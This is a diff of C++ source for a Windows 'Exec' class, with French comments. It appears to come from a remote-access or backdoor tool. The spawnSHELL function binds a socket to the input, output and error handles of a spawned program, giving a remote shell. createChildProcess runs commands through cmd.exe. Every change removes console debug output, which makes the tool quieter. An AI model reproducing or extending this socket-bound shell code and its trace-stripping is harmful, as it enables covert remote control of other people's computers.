@@ -107,7 +107,6 @@ PROCESS_INFORMATION Exec::createChildProcess(wstring &command)
     siStartInfo.hStdOutput = a_hChildStd_OUT_Wr;
     siStartInfo.dwFlags |= STARTF_USESTDHANDLES; //Les membres hStdInput , hStdOutput et hStdError contiennent des informations supplémentaires. Si cet indicateur est spécifié lors de l'appel de l'une des fonctions de création de processus, les handles doivent être héritables et le paramètre bInheritHandles de la fonction doit être défini sur TRUE. Pour plus d'informations, consultez Gérer l'héritage .
 
-    wcout << argv_cmd << endl;
 
     bSuccess = CreateProcessW(L"C:\\windows\\system32\\cmd.exe",  //command line 
         argv_cmd,     // argv of cmd
@@ -126,7 +125,6 @@ PROCESS_INFORMATION Exec::createChildProcess(wstring &command)
     {
         //if timeout
         a_timeout = TRUE;
-        wcout << "timeout !!" << endl; 
     }
 
     CloseHandle(a_hChildStd_ERR_Wr);
@@ -138,8 +136,6 @@ PROCESS_INFORMATION Exec::createChildProcess(wstring &command)
     if (!bSuccess)
     {
         a_error = TRUE;
-        wcout << "error 1" << endl;
-        wcout << GetLastError() << endl;
         //exit(1);
     }
     return piProcInfo;
@@ -273,10 +269,6 @@ VOID Exec::spawnSHELL(SOCKET &sock, WCHAR *prog) //Change to WCHAR
     siStartInfo.hStdInput = (HANDLE)sock;
     siStartInfo.hStdOutput = (HANDLE)sock;
     siStartInfo.hStdError = (HANDLE)sock;
-
-
-    wcout << GetConsoleCP << endl;
-    wcout << GetConsoleOutputCP << endl;
 
     CreateProcessW(NULL,  //command line 
         prog,     // argv of cmd
